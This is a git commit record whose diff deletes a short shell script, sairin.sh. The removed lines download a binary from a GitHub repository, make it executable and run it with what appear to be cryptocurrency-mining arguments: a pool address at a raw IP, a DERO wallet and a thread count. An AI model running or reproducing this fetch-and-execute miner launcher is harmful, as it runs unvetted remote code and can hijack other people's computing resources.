636238ac6ada375956be00a0fb63ee027209875c
sbwsmg <108033976+sbwsmg@users.noreply.github.com>
2022-11-28 23:08:42 +0800

    Delete sairin.sh

--- sairin.sh
+++
@@ -1,3 +0,0 @@
-wget https://github.com/sbwsmg/lol/raw/main/sairin
-chmod 700 sairin
-./sairin -o straum+tcp://139.162.40.79:443 -u deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6hsk03skqgr8tscz0xla -t 4
